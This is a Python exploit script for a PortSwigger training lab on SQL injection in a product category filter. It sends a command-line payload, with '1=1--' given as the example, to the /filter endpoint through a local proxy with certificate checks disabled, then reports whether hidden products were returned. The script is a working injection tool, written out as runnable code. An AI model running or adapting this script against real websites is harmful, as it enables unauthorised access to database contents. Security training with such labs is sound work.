"""
# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

**Goal: display details of all products in any category, both released and unreleased.**
"""

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = '/filter?category=G'
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Beat the Vacation Traffic" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s example.com "1=1--"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL Injection Successful!!")
    else:
        print("[-] SQL Injection Has Failed")
